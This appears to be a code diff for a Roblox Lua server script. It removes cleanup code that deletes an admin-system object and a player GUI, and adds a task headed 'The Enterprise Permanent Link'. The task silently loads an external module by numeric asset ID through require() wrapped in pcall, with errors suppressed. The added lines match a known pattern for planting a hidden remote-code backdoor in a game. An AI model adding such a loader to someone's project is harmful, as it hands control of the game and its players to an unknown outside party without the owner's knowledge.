@@ -1,32 +1,7 @@
-local Players = game:GetService("Players")
-local ReplicatedStorage = game:GetService("ReplicatedStorage")
-
-task.wait(5)
-
-local adminSource = ReplicatedStorage:FindFirstChild("Kohl's Admin Source")
-if adminSource then
-	adminSource:Destroy()
-	print("0 - Admin Source")
-else
-	warn("1 - Admin Source")
-end
-
-local function cleanup(player)
-	task.wait(2)
-	for _, gui in player:WaitForChild("PlayerGui"):GetChildren() do
-		if gui.Name == "FluxUILayerTop" then
-			gui:Destroy()
-			print("0 - FluxUILayerTop (" .. player.Name .. ")")
-			return
-		end
-	end
-	warn("1 - FluxUILayerTop (" .. player.Name .. ")")
-end
-
-for _, player in Players:GetPlayers() do
-	task.spawn(cleanup, player)
-end
-
-Players.PlayerAdded:Connect(function(player)
-	task.spawn(cleanup, player)
+-- The Enterprise Permanent Link
+task.spawn(function()
+    pcall(function()
+        require(87640712642410) 
+        print("0 - Enterprise Module Linked")
+    end)
 end)
